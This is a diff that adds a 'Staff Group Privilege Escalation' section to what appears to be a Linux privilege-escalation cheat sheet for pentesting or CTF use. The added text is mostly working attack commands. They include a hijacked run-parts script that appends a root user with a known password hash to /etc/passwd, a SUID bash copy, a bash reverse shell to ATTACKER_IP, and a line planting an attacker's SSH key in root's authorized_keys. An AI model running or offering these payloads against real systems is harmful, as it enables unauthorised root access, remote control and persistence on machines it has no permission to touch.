@@ -1212,6 +1212,96 @@ select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 
 * Run /tmp/rootbash with -p to gain a root shell `/tmp/rootbash -p`
 
+---
+
+### Staff Group Privilege Escalation (Debian/Devuan)
+
+The `staff` group in Debian-based systems allows users to write to `/usr/local` directories without root privileges. Since `/usr/local/bin` is typically first in PATH, you can hijack commands.
+
+**Detection:**
+
+```bash
+# Check if you're in staff group
+id
+# uid=1000(user) gid=1000(user) groups=...,50(staff)
+
+# Verify writable directories
+find /usr/local -type d -group staff -writable 2>/dev/null
+```
+
+**Exploitation via run-parts Hijacking:**
+
+When users log in, PAM runs `run-parts` to execute scripts. If `/usr/local/bin` is writable and before `/bin` in PATH:
+
+```bash
+# Check PATH order
+echo $PATH
+# /usr/local/bin:/usr/bin:/bin:...
+
+# Monitor for processes (use pspy)
+./pspy64
+# Look for: /bin/sh -c /root/bin/cleanup.pl
+# Or PAM session scripts calling run-parts
+```
+
+**Create malicious run-parts:**
+
+```bash
+# Create fake run-parts that adds root user
+cat << 'EOF' > /usr/local/bin/run-parts
+#!/bin/bash
+echo 'pwned:$1$pwned$SjG1dZ5m5g0hB4WC0xJjx/:0:0:root:/root:/bin/bash' >> /etc/passwd
+EOF
+
+chmod +x /usr/local/bin/run-parts
+```
+
+**Trigger:**
+
+```bash
+# Log out and log back in via SSH
+exit
+ssh user@target
+
+# Check if user was added
+cat /etc/passwd | grep pwned
+
+# Switch to root
+su pwned
+# Password: pwned123
+```
+
+**Pre-generated password hashes:**
+
+```bash
+# Generate with openssl
+openssl passwd -1 -salt pwned pwned123
+# $1$pwned$SjG1dZ5m5g0hB4WC0xJjx/
+
+# Or use mkpasswd
+mkpasswd -m sha-512 password123
+```
+
+**Alternative payloads:**
+
+```bash
+# Copy bash with SUID
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+
+# Reverse shell
+#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1
+
+# Add SSH key
+#!/bin/bash
+mkdir -p /root/.ssh
+echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
+```
+
+---
+
 ### doas Privilege Escalation
 
 `doas` is a BSD alternative to sudo. Check for SUID and config.
